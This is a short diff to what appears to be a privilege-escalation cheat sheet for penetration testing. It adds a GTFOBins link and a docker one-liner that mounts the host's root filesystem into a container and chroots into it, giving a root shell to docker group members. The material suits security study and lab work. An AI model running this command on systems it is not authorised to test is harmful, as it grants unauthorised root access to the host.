@@ -97,6 +97,10 @@ Group Video, Using the command w you can find who is logged on the system.
 
 Group Docker you can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a chroot into that volume. This effectively gives you root on the machine.
 ```
+https://gtfobins.github.io/gtfobins/docker/
+
+`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
+
 
 ### Checking apache logs
 `/var/log/apache2/*.log`  
